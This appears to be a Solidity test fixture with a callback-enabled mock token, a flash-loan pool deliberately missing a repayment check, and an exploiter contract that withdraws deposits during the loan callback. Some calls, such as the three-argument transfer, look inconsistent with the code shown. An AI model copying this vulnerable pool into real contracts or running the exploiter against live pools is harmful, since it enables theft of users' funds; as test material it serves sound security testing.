// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ReentrantToken} from "./ReentrantToken.sol";

// ERC20 token with callback hooks (ERC777-style), used by lending/flashloan tests.
contract MockToken is ReentrantToken {
    bool public hooksEnabled = true;

    function transferWithCallback(address to, uint256 amt, bytes calldata data) external returns (bool) {
        require(balances[msg.sender] >= amt);
        balances[msg.sender] -= amt;
        balances[to] += amt;
        if (hooksEnabled && data.length > 0) {
            (bool ok,) = to.call(data);
            ok;
        }
        return true;
    }
}

// Flash loan pool with exploitable callback.
contract FlashLoanPool {
    MockToken public token;
    mapping(address => uint256) public deposits;

    constructor(MockToken _token) { token = _token; }

    function deposit(uint256 amt) external {
        token.mint(address(this), amt);
        deposits[msg.sender] += amt;
    }

    function flashLoan(uint256 amt, bytes calldata data) external {
        require(deposits[msg.sender] >= amt, "insufficient deposit");
        uint256 preBalance = token.balances(address(this));
        token.transfer(msg.sender, amt, data);
        // BUG: no check that balance is restored after callback
    }

    function withdraw(uint256 amt) external {
        require(deposits[msg.sender] >= amt);
        deposits[msg.sender] -= amt;
        token.transfer(msg.sender, amt, "");
    }
}

// Attacker: takes flash loan, drains pool during callback.
contract FlashLoanExploiter {
    FlashLoanPool public pool;
    MockToken public token;
    bool private attacking;

    constructor(FlashLoanPool _pool, MockToken _token) {
        pool = _pool;
        token = _token;
    }

    function depositToPool(uint256 amt) external {
        token.mint(address(this), amt);
        pool.deposit(amt);
    }

    function attack(uint256 amt, bytes calldata data) external {
        attacking = true;
        pool.flashLoan(amt, data);
        attacking = false;
    }

    fallback() external {
        if (attacking) {
            // During flash loan callback, withdraw all deposits
            uint256 bal = pool.deposits(address(this));
            if (bal > 0) pool.withdraw(bal);
        }
    }
}
